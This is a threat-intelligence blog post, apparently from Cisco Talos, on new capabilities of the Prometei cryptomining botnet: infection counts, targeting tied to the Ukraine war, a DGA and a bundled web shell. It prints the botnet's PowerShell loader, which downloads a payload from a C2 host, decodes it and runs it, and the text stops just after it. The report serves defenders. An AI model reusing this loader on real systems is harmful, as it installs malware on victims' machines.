---
title: Prometei botnet improves modules and exhibits new capabilities in recent updates
url: https://blog.talosintelligence.com/prometei-botnet-improves/
source: Over Security - Cybersecurity news aggregator
date: 2023-03-10
fetch_date: 2025-10-04T09:10:13.382195
---

# Prometei botnet improves modules and exhibits new capabilities in recent updates

# Cisco Talos Blog

[ ]

* [Intelligence Center](https://talosintelligence.com/reputation)

  [ ]

  + [# Intelligence Center](https://talosintelligence.com/reputation)
  + BACK
  + [Intelligence Search](https://talosintelligence.com/reputation_center)
  + [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)
* [Vulnerability Research](https://talosintelligence.com/vulnerability_info)

  [ ]

  + [# Vulnerability Research](https://talosintelligence.com/vulnerability_info)
  + BACK
  + [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)
  + [Microsoft Advisories](https://talosintelligence.com/ms_advisories)
* [Incident Response](https://talosintelligence.com/incident_response)

  [ ]

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](https://talosintelligence.com/incident_response/services#reactive-services)
  + [Proactive Services](https://talosintelligence.com/incident_response/services#proactive-services)
  + [Emergency Support](https://talosintelligence.com/incident_response/contact)
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  [ ]

  # Security Resources

  + BACK

  Security Resources
  + [Open Source Security Tools](https://talosintelligence.com/software)
  + [Intelligence Categories Reference](https://talosintelligence.com/categories)
  + [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)
* Media

  [ ]

  # Media

  + BACK

  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  [ ]

  # Company

  + BACK

  Company
  + [About Talos](https://talosintelligence.com/about)
  + [Careers](https://talosintelligence.com/careers)

# Prometei botnet improves modules and exhibits new capabilities in recent updates

By
[Andrew Windsor](https://blog.talosintelligence.com/author/andrew/),
[Vanja Svajcer](https://blog.talosintelligence.com/author/vanja-svajcer/)

Thursday, March 9, 2023 08:02

[Threat Spotlight](https://blog.talosintelligence.com/category/threat-spotlight/)
[Threats](https://blog.talosintelligence.com/category/threats/)

* Prometei botnet continued its activity since Cisco Talos first reported about it in 2020.  Since November 2022, we have observed Prometei improving the infrastructure components and capabilities. More specifically, the botnet operators updated certain submodules of the execution chain to automate processes and challenge forensic analysis methods.
* We assess with high confidence that v3 of the Prometei botnet is of medium size, with more than 10,000 infected systems worldwide, based on data obtained by sinkholing the DGA domains over a period of one week in February 2023.
* Based on open-source intelligence, the actors have also been actively spreading improved Linux versions of the Prometei bot, continuously improving the current version, v3.
* We have observed previously undocumented functionality, including an alternative C2 domain generating algorithm (DGA), a self-updating mechanism, and a bundled version of the Apache Webserver with a web shell that’s deployed onto victim hosts, improving the overall technical capabilities of the botnet.
* Additionally, the bot’s targeting may have been influenced by the war in Ukraine. The only excluded country in the Tor configuration is Russia, as supposed to earlier variants, which also avoided exit nodes in other CIS countries.

Prometei, a highly modular botnet with worm-like capabilities that primarily deploys the Monero cryptocurrency miner, has been continuously improved and updated since it was first seen in 2016, posing a persistent threat to organizations. Talos first analyzed this threat [in our 2020 blog post](https://blog.talosintelligence.com/prometei-botnet-and-its-quest-for-monero/), highlighting its large repertoire of modules, multiple methods of spreading, and continuous development. In our initial analysis and current activity tracking that began in November 2022, we observed Prometei deploying Windows-based tools and malware and other Linux versions observed [by security researchers](https://cujo.com/iot-malware-journals-prometei-linux/).

Talos observed Prometei’s cryptocurrency mining and credential theft activity to be financially motivated and geographically indiscriminate. Its infections are likely opportunistic, targeting vulnerable entities in all regions and industry verticals to support a higher yield of harvested credentials and mining of the Monero cryptocurrency.

#### Prometei victimology

We assess with high confidence that the Prometei v3 botnet is of medium size, with approximately 10,000 infected systems worldwide, based on data acquired by sinkholing the DGA domains over a period of one week in February.

The geographical distribution of infected systems shows a uniform distribution proportional to the population of the countries, with traffic captured from 155 countries. As expected with a uniform distribution, the most populous countries have the largest number of infected systems, with the exception of Brazil, Indonesia and Turkey displaying a higher proportion of infections compared to those countries’ populations.

A single country that stands out is Russia, with a disproportionately smaller number of infections, accounting for 0.31 percent of all infected systems, supporting our assessment of the bot’s targeting being influenced by the Russia-Ukraine conflict based on its Tor configuration.

![](https://lh6.googleusercontent.com/QVuHure8mGHZKEvWtn7bslrPpBJQwadV8gL7NnpOdU9uUlimA6UVq0IsptLeyh1i4QBPdI1FxJs_buYiAYvt3KHg6tU4HO1zo1qLrQTZsdxg4jS3oOu2tCb0n9fj2JUeyhC8rnkK8Euqp3Xf7FRRSeU)

We assess the Prometei threat remains ongoing and will evolve for the foreseeable future. Its common C2 infrastructure continues to show a steady stream of activity, while the operators consistently rotate its malware and cryptomining hosts. Their regular updating and expansion of Prometei’s modules demonstrate commitment and technical knowledge that will enable them to continue proliferating the botnet to new victims and adapting to new defenses and protections. The noted addition of backdoor capabilities to sqhost.exe by our previous research and the inclusion of a bundled web shell in our current observations could indicate the operators are adding persistence measures to keep Prometei active on targeted machines, or a gradual shift or expansion to other types of payloads and activity.

### Updates to Prometei’s common execution chain demonstrate improved capabilities

Talos’ analysis of the botnet’s execution chain revealed that, while some infrastructure components remain unchanged from our 2020 reporting, the Prometei operators have made modifications that automate component and infrastructure updating, impair defenders’ analysis, and further entrench the actor on victim machines. We observed the execution chain and subsequent actions performed by the botnet were initiated by a malicious PowerShell command that downloaded the primary listening and execution module, referred to throughout as “sqhost.exe.” It generally resembles some form of the following:

```
cmd /C echo 123>C:\Windows\mshlpda32.dll&powershell $p='C:\windows\zsvc.exe';(New-Object Net.WebClient).DownloadFile('[C2_HOST]/k.php?B={PARAMS}',$p);$d=[IO.File]::ReadAllBytes($p);$t=New-Object Byte[]($d.Length);[int]$j=0;for([int]$i=0;$i -lt $d.Length;$i++){$j+=66;$t[$i]=(($d[$i] -bxor ($i*3 -band 255))-$j) -band 255;}[io.file]::WriteAllBytes($p,$t);Start-Process $p;
```

As the above command illustrates, the...